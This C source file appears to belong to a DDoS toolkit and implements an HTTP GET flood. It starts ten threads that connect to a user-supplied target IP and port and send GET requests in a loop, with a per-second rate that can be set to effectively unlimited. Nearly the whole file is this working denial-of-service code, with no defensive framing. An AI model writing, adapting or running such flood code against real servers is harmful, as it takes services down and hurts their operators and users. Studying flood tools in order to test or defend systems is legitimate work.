#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../ddos/get_flood.h"
#include "../base/subnet_mask.h"

unsigned int get_total;
unsigned int get_produced;

unsigned int get_per_second;
unsigned int get_duration;
double get_elapsed_time;

int get_src_ip_mask;
int get_dest_ip_mask;

char get_now_src_ip[16];
char get_now_dest_ip[16];

char get_dest_ip[16];
char get_src_ip[16];

int get_dest_port;

pthread_mutex_t get_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t get_cond = PTHREAD_COND_INITIALIZER;

struct timespec get_time1, get_time2;

char get_request[__GET_REQUEST_MSG_SIZE__ ];

void get_flood_print_usage(int mode) {

	if (mode == 2)
		printf(
				"get flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_get_flooding3(void *data) {
	int thread_id = *((int*) data);

	int first_run = 1;
	int sock;
	while (1) {

		if (first_run == 1) {
			sock = socket(AF_INET, SOCK_STREAM, 0);
			if (sock == -1)
				perror("sock creation failed\n");

			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(get_dest_ip);
			servaddr.sin_port = htons(get_dest_port);

			if (connect(sock, (struct sockaddr*) &servaddr, sizeof(servaddr))
					!= 0)
				perror("connect failed\n");
			first_run = 0;
		}

		pthread_mutex_lock(&get_mutex);

		//Conditions begin.
		if (get_produced >= get_per_second) {
			pthread_cond_wait(&get_cond, &get_mutex);
		}

		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &get_time2);
		double get_elapsed_time = (get_time2.tv_sec - get_time1.tv_sec)
				+ ((get_time2.tv_nsec - get_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (get_elapsed_time >= 1.0) {

			printf("-.\n");
			get_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &get_time1);
			pthread_cond_signal(&get_cond);
		}

		send(sock, get_request, strlen(get_request), 0);

		get_produced++;
		get_total++;

		printf("%d getmsg sent\n", get_produced);

		pthread_mutex_unlock(&get_mutex);

	}

	return 0;
}

void* get_time_check(void *data) {

	while (1) {
		pthread_mutex_lock(&get_mutex);
		//Get Time
		clock_gettime(CLOCK_MONOTONIC, &get_time2);
		double get_elapsed_time = (get_time2.tv_sec - get_time1.tv_sec)
				+ ((get_time2.tv_nsec - get_time1.tv_nsec) / 1000000000.0);

		//If time > 1.0
		if (get_elapsed_time >= 1.0) {

			printf("-.\n");
			get_produced = 0;

			clock_gettime(CLOCK_MONOTONIC, &get_time1);
			pthread_cond_signal(&get_cond);
		}
		pthread_mutex_unlock(&get_mutex);
	}
}

void get_flood_run(char *argv[], int mode) {

	FILE *get_f;

	/* Will be implemented Later....
	 get_f=fopen("./src/ddos/http_request.txt","rb");
	 if(get_f==NULL)
	 {
	 perror("open error! does http_get_request.txt exist?\n");
	 exit(1);
	 }
	 char buffer[__GET_REQUEST_MSG_SIZE__];
	 while(fgets(buffer,__GET_REQUEST_MSG_SIZE__,get_f)!=NULL)
	 {
	 strcat(get_request,buffer);
	 strcat(get_request,"\r\n");
	 }
	 strcat(get_request,"\r\n");
	 fclose(get_f);
	 */
	strcpy(get_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
	printf("Requesting:\n%s\n", get_request);

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 2 && argc != 4) {
		get_flood_print_usage(mode);
		return;
	}

	//ip separtion IP/mask -> IP , mask
	get_ip_from_ip_addr(argv[0], get_src_ip);
	get_src_ip_mask = get_mask_from_ip_addr(argv[0]);
	strcpy(get_now_src_ip, get_src_ip);

	get_ip_from_ip_addr(argv[1], get_dest_ip);
	get_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
	strcpy(get_now_dest_ip, get_dest_ip);

	get_produced = 0;

	if (mode == 2) {
		get_total = 0;
		get_per_second = atoi(argv[3]);

		if (get_per_second == 0)
			get_per_second = __UINT_MAXIMUM__;

		get_dest_port = atoi(argv[2]);
	}

	int num_threads = 10;

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Sending get requests to %s using %d threads %d per sec\n", get_dest_ip,
			num_threads,get_per_second);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;
	clock_gettime(CLOCK_MONOTONIC, &get_time1);

	for (i = 0; i < num_threads; i++) {
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL, generate_get_flooding3,
					(void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, get_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("get flood finished\nTotal %d packets sent.\n", get_total);

	pthread_mutex_destroy(&get_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);

	return;
}
